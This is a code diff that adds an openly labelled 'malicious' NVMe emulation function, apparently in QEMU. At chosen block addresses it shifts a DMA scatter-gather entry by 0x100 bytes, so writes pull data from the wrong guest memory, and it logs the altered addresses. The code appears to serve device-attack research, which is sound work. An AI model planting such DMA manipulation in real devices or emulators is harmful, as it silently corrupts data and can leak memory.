+/* add by yin: malicious NVMe PRP/DMA experiment */
+#define MAL_NVME_SHIFT_BYTES 0x100
+
+static void mal_shift_write_sg(NvmeRequest *req, uint64_t slba, uint64_t data_size)
+{
+    NvmeSg *sg = &req->sg;
+    int idx = -1;
+
+     /*
+     * Only inject WRITE at selected SLBAs.
+     * This avoids corrupting mkfs/mount/filesystem metadata writes.
+     */
+    switch (slba) {
+    case 200001:
+        /*
+         * 8192 bytes:
+         * sg[0] = PRP1
+         * sg[1] = PRP2 as second data page
+         */
+        if (data_size == 8192) {
+            idx = 1;
+        }
+        break;
+    case 200002:
+        /*
+         * 16384 bytes:
+         * shift PRP List Entry[0]
+         */
+        if (data_size == 16384) {
+            idx = 1;
+        }
+        break;
+    case 200003:
+        /*
+         * 16384 bytes:
+         * shift PRP List Entry[1]
+         */
+        if (data_size == 16384) {
+            idx = 2;
+        }
+        break;
+    case 200004:
+        /*
+         * 16384 bytes:
+         * shift PRP List Entry[2]
+         */
+        if (data_size == 16384) {
+            idx = 3;
+        }
+        break;
+    default:
+        return;
+    }
+
+    if (idx < 0) {
+        return;
+    }
+
+    /*
+     * Your experiment is PRP mode, so req->sg should be DMA.
+     * If it is not DMA, it may be CMB/PMR or unexpected mapping.
+     */
+    if (!(sg->flags & NVME_SG_DMA)) {
+        printf("[mal-nvme][inject] skip: sg is not DMA\n");
+        return;
+    }
+
+    if (sg->qsg.nsg <= idx) {
+        printf("[mal-nvme][inject] skip: nsg=%d, target idx=%d\n",
+               sg->qsg.nsg, idx);
+        return;
+    }
+
+    printf("[mal-nvme][inject] target WRITE matched\n");
+    printf("  slba      = %" PRIu64 "\n", slba);
+    printf("  data_size = %" PRIu64 "\n", data_size);
+    printf("  nsg       = %d\n", sg->qsg.nsg);
+
+    for (int i = 0; i < sg->qsg.nsg; i++) {
+        printf("  sg[%d] base=0x%016" PRIx64 " len=%" PRIu64 "\n",
+               i,
+               (uint64_t)sg->qsg.sg[i].base,
+               (uint64_t)sg->qsg.sg[i].len);
+    }
+
+    printf("==========================================\n");
+    printf("[mal-nvme][inject] WRITE DMA shift matched\n");
+    printf("  slba      = %" PRIu64 "\n", slba);
+    printf("  data_size = %" PRIu64 "\n", data_size);
+    printf("  nsg       = %d\n", sg->qsg.nsg);
+
+    for (int i = 0; i < sg->qsg.nsg; i++) {
+        printf("  sg[%d] base=0x%016" PRIx64 " len=%" PRIu64 "%s\n",
+               i,
+               (uint64_t)sg->qsg.sg[i].base,
+               (uint64_t)sg->qsg.sg[i].len,
+               i == idx ? "  <-- target" : "");
+    }
+
+    printf("[mal-nvme][inject] shift sg[%d] by 0x%x\n",
+           idx, MAL_NVME_SHIFT_BYTES);
+    printf("  original base = 0x%016" PRIx64 "\n",
+           (uint64_t)sg->qsg.sg[idx].base);
+
+    sg->qsg.sg[idx].base += MAL_NVME_SHIFT_BYTES;
+
+    printf("  fake base     = 0x%016" PRIx64 "\n",
+           (uint64_t)sg->qsg.sg[idx].base);
+    printf("==========================================\n");
+}
